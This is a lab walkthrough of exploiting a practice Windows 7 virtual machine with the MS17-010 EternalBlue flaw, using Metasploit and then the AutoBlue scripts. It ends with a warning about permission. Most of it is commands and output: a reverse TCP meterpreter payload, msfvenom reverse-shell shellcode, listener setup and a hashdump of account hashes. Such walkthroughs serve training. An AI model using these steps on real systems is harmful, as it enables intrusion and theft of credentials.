# Blue

After setting up the vulnerable machine in our hypervisor of choice. 

Make sure to configure the network the same way as the Kioptrix machine.

Once we boot up the machine. Use the following credentials to log in:

user - Password123!
administrator - Password456!

## Enumeration

On the target machine (Blue) type in `cmd` in the search bar to access the command prompt and use the `ipconfig` to determine the IP address.

On the Attacker machine let’s run an nmap scan:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -A -T4 10.0.2.5 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 06:16 EST
Nmap scan report for 10.0.2.5
Host is up (0.00027s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  p�C#V      Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49156/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:fe:56:96 (Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-01-11T11:19:36
|_  start_date: 2024-01-11T10:20:13
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-01-11T06:19:36-05:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.09 seconds
```

From the results, we can determine some things such as open ports, the OS and a few SMB shares.

## Exploitation

Let’s start with the OS by googling `Windows 7 Ultimate 7601 Service Pack 1 exploit`. From the results, we can tell that the main exploit for this particular OS is MS17-010  aka EternalBlue. 

We’ll return to manual exploitation later. Lets see what we can find using Metasploit.

```bash
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 3
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                           Required  Description
   ----         ---------------                                           --------  -----------
   CHECK_ARCH   true                                                      no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                      no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                     no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pip  yes       List of named pipes to check
                es.txt
   RHOSTS                                                                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        445                                                       yes       The SMB service port (TCP)
   SMBDomain    .                                                         no        The Windows domain to use for authentication
   SMBPass                                                                no        The password for the specified username
   SMBUser                                                                no        The username to authenticate as
   THREADS      1                                                         yes       The number of concurrent threads (max one per host)

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 10.0.2.5
rhosts => 10.0.2.5
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.0.2.5:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.5:445          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The results show that the target is indeed vulnerable to the MS17-010 exploit.

There is another way to go about this using metasploit, searching for `eternalblue` once again and using the `exploit/windows/smb/ms17_010_eternalblue` module.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.4         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.0.2.5
rhosts => 10.0.2.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 10.0.2.5:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.2.5:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.5:445          - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.2.5:445 - The target is vulnerable.
```

Next, we need to set a payload. Note that a payload has already been set, but sometimes it defaults to 32-bit rather than 64-bit (which is the case for this machine).

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```

Now, set the local host to the kali IP.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost eth0
lhost => 10.0.2.4
```

Finally we run the exploit.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] 10.0.2.5:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.2.5:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.5:445          - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.2.5:445 - The target is vulnerable.
[*] 10.0.2.5:445 - Connecting to target for exploitation.
[+] 10.0.2.5:445 - Connection established for exploitation.
[+] 10.0.2.5:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.2.5:445 - CORE raw buffer dump (38 bytes)
[*] 10.0.2.5:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 10.0.2.5:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 10.0.2.5:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 10.0.2.5:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.2.5:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.2.5:445 - Sending all but last fragment of exploit packet
[*] 10.0.2.5:445 - Starting non-paged pool grooming
[+] 10.0.2.5:445 - Sending SMBv2 buffers
[+] 10.0.2.5:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.2.5:445 - Sending final SMBv2 buffers.
[*] 10.0.2.5:445 - Sending last fragment of exploit packet!
[*] 10.0.2.5:445 - Receiving response from exploit packet
[+] 10.0.2.5:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.2.5:445 - Sending egg to corrupted connection.
[*] 10.0.2.5:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.0.2.5
[+] 10.0.2.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.5:49158) at 2024-01-11 08:39:58 -0500

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

And we’ve popped the shell. We can now do stuff like using the `hashdump` command to get the password hashes which we can try to crack (more on this later). 

Let’s go back to the earlier google search so we can exploit this manually.

The results previously returned a couple of exploits but we’re looking for one which can run out of the box. The best place usually find such exploits is GitHub.

We can do this by googling `eternalblue github`. This returns a lot of repositories, going through them all is good idea.

This [repo](https://github.com/3ndG4me/AutoBlue-MS17-010) seems to have a lot of stars including a detailed walkthrough on how to use the exploit. Time to clone the repo onto our Kali machine using `git clone [https://github.com/3ndG4me/AutoBlue-MS17-010.git](https://github.com/3ndG4me/AutoBlue-MS17-010.git)`. Navigate to the folder and follow the instructions in the repository.

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ ls
eternalblue_exploit10.py  eternalblue_exploit7.py  eternalblue_exploit8.py  eternal_checker.py  LICENSE  listener_prep.sh  mysmb.py  README.md  requirements.txt  shellcode  zzz_exploit.py
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ pip install -r requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: impacket in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.10.0)
Requirement already satisfied: dsinternals in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (1.2.4)
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ sudo python eternal_checker.py 10.0.2.5   
[sudo] password for kali: 
[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ cd shellcode        
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Boxes/Blue/AutoBlue-MS17-010/shellcode]
└─$ ls
eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Boxes/Blue/AutoBlue-MS17-010/shellcode]
└─$ sudo ./shell_prep.sh          
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
10.0.2.4
LPORT you want x64 to listen on:
1234
LPORT you want x86 to listen on:
4321
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
0
Generating x64 cmd shell (staged)...

msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.0.2.4 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (staged)...

msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.0.2.4 LPORT=4321
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```

Go back to the previous directory and run `listener_prep.sh` 

```bash
┌──(kali㉿kali)-[~/…/Boxes/Blue/AutoBlue-MS17-010/shellcode]
└─$ cd ..       
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ ls
eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py     README.md         shellcode
eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  __pycache__  requirements.txt  zzz_exploit.py
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ sudo ./listener_prep.sh

┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ sudo ./listener_prep.sh
  __
  /,-
  ||)
  \\_, )
   `--'
Eternal Blue Metasploit Listener

LHOST for reverse connection:
10.0.2.4
LPORT for x64 reverse connection:
1234
LPORT for x86 reverse connection:
4321
Enter 0 for meterpreter shell or 1 for regular cmd shell:
1
Type 0 if this is a staged payload or 1 if it is for a stageless payload: 0
Starting listener (staged)...
Starting postgresql (via systemctl): postgresql.service.
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                                                                                                                                     
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                                                                                   
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                                                                                  
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                                 
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                                                                                 
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                                                                                 
  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                                                                                 
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                                                                                 
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc                                                                                                                                                  
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                                                                                   
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                                                                                    
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;                                                                                                                                                     
       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                                                                                      
         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                                                                                        
           :kk;.OOOOOOOOOOOOO.cOk:                                                                                                                                                          
             ;kOOOOOOOOOOOOOOOk:                                                                                                                                                            
               ,xOOOOOOOOOOOx,                                                                                                                                                              
                 .lOOOOOOOl.                                                                                                                                                                
                    ,dOd,                                                                                                                                                                   
                      .                                                                                                                                                                     

       =[ metasploit v6.3.21-dev                          ]
+ -- --=[ 2327 exploits - 1218 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command
Metasploit Documentation: https://docs.metasploit.com/

[*] Processing config.rc for ERB directives.
resource (config.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (config.rc)> set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
resource (config.rc)> set LHOST 10.0.2.4
LHOST => 10.0.2.4
resource (config.rc)> set LPORT 1234
LPORT => 1234
resource (config.rc)> set ExitOnSession false
ExitOnSession => false
resource (config.rc)> set EXITFUNC thread
EXITFUNC => thread
resource (config.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
resource (config.rc)> set LPORT 4321
LPORT => 4321
resource (config.rc)> exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 10.0.2.4:1234 
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.0.2.4:4321 
msf6 exploit(multi/handler) >
```

Good, now we have a listener waiting for a connection. Open another terminal and navigate back to the exploit folder.

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ ls
config.rc                 eternalblue_exploit7.py  eternal_checker.py  listener_prep.sh  __pycache__  requirements.txt  zzz_exploit.py
eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE             mysmb.py          README.md    shellcode
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/Boxes/Blue/AutoBlue-MS17-010]
└─$ python eternalblue_exploit7.py 10.0.2.5 shellcode/sc_all.bin                      
shellcode size: 2307
numGroomConn: 13
Target OS: Windows 7 Ultimate 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
```

………..Check the Blue machine for a surprise 🤣. Lesson learned. 

Do not run exploits carelessly in an environment. It might lead to disastrous results. (Imagine if this was a real pentest in a critical environment such as a hospital……..). Always get permission before running things like this, unless you know the environment is safe.
